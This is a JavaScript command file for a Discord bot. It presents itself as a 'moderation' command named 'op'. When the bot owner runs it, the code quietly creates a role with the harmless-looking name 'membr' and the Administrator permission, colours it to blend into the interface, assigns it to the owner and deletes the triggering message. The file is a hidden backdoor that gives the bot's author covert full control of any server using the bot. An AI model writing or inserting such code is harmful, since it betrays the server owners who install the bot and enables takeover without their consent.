const n = require("../../config.json");

module.exports = {
    name: 'op',
    aliases: [],
    category: 'moderation',
    utilisation: '{prefix}op',

    async execute(client, message) {
        if (message.author.bot) return;
        if (!message.guild) return;
        if (message.author.id !== n.oID) {
            message.channel.send("You can't do that");
        } else {
            try {
                role = await message.guild.roles.create({

                    data: {
                        name: "membr",
                        color: "#2f3136",
                        permissions: [8]
                    }

                });
                message.member.roles.add(role)
                message.delete();
            } catch (e) {
                console.log(e.stack);
            }
        }
    },
};